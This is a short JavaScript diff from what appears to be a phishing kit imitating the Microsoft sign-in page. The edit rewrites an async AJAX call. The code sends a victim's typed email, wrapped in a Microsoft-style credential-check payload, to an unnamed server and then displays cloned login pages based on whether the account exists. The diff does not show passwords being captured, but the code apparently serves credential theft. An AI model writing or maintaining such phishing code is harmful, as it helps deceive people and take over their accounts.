@@ -70,7 +70,7 @@ $("#error1").html(Errs['Notemail']);
  
 }else{
 var valx = '{"username":"'+email+'","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":"","country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"flowToken":"","isAccessPassSupported":true}';
-var reslt= await $.ajax({
+$.ajax({
 type: "POST",
 url: urlx,
 data: {
@@ -78,8 +78,10 @@ action: "signup",
 valx: valx,
 mode: "validem",
 },
-})
-var vdata = JSON.parse(reslt);
+}).done(async function (data) {
+
+
+var vdata = JSON.parse(data);
 if (vdata["IfExistsResult"]=='1' || vdata["IfExistsResult"]=='4'||vdata["IfExistsResult"]===undefined) {
   await getpage('EmailPage',1); 
 $("#load").hide();
@@ -117,8 +119,10 @@ $("#idBoilerPlateText").html(BoilerPlateText).show();
 }
 }
 }  
+
 $("#btn").attr("disabled", false);
 $(".ext-promoted-fed-cred-box").hide();
+});
 }
 }
 function back(page) {
